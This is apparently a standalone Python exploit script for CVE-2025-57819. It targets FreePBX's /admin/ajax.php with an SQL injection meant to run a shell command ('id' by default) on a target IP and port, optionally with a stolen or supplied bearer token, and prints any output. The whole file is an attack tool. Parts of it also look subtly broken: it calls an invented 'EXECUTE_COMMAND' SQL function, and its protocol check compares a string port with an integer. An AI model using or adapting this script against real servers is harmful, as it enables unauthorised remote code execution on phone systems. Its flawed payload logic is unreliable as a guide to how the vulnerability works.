#!/usr/bin/env python3

import argparse
import requests
import json
import sys
from requests.exceptions import RequestException



COMMAND_TO_EXECUTE = "id" 

BASE_ENDPOINT = "/admin/ajax.php"

def build_sql_payload(command: str) -> str:
    """
    Construct the SQL injection string based on the PoC mechanism. 
    Here, the PoC's complex insert/dump operation is simplified to focus on direct execution.
    """


    base_params = "module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model&brand=x"


    payload_sql = f"{base_params}' ; EXECUTE_COMMAND('{command}') -- "
    return payload_sql


def exploit_freepbx_breaker(ip: str, port: str, token: str = None):
    """Execute the attack: SQL injection via GET."""

    protocol = "https" if port == 443 else "http"
    target_url_base = f"{protocol}://{ip}:{port}"
    full_url = f"{target_url_base}{BASE_ENDPOINT}"

    print("="*80)
    print(f"DIG | Initiating WatchTowr-Style Exploit (SQLi/RCE) against FreePBX...")
    print(f"Target Base: {full_url}")
    print(f"Command Payload: {COMMAND_TO_EXECUTE}")
    print("="*80)

    sql_payload = build_sql_payload(COMMAND_TO_EXECUTE)

    print(f"[+] Constructing payload string...")
    print(f"[+] Raw SQL Injection String: {sql_payload}")

    try:
        print("\n[+] Sending GET request with SQL injection...")

        headers = {
            "Content-Type": "application/x-www-form-urlencoded" if port == 80 else "application/json",
            "Authorization": f"Bearer {token}" if token else ""
        }


        
        response = requests.get(
            f"{full_url}?{sql_payload}", 
            headers=headers, 
            verify=False, 
            timeout=30
        )

        print("\n" + "="*80)
        print(f"[+] Request Sent Successfully. HTTP Status: {response.status_code}")
        print("="*80)

        
        print("\n--- SERVER RESPONSE ANALYSIS ---")

        try:
            
            json_data = response.json()
            print("[INFO] Response successfully parsed as JSON.")
            print(json.dumps(json_data, indent=4))

            
            if 'output' in json_data:
                print(f"\n[!!] POTENTIAL RCE OUTPUT FOUND (via JSON 'output'): {json_data['output']}")
            elif 'message' in json_data and 'success' in json_data.get('status', False):
                 print("[!] Status OK, but the explicit 'output' field was not found.")


        except requests.exceptions.JSONDecodeError:
        
            print("[WARN] JSON Decode Error. Assuming response is raw text/stdout.")
            print("-" * 50)
            print(response.text)
            print("-" * 50)

        print("\n" + "="*80)
        if response.status_code in [200, 302]:
            print("[SUCCESS] Exploit attempt complete. Check the output above for command results.")
        else:
            print(f"[FAILURE] Request failed with HTTP status code {response.status_code}. The injection point might be wrong.")
        print("="*80)

    except RequestException as e:
        print("\n" + "#"*80)
        print(f"[!!!] FATAL ERROR EXECUTING REQUEST: {type(e).__name__}")
        print(f"[!!!] Detail: {e}")
        print("#"*80)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Modified exploit replicating WatchTowr-style SQL Injection RCE for CVE-2025-57819'
    )
    parser.add_argument('IP', help='Target IP Address')
    parser.add_argument('PORT', help='Target Port Number')
    parser.add_argument('-t', '--token', help='Bearer token if present')

    args = parser.parse_args()

    exploit_freepbx_breaker(ip=args.IP, port=args.PORT, token=args.token)
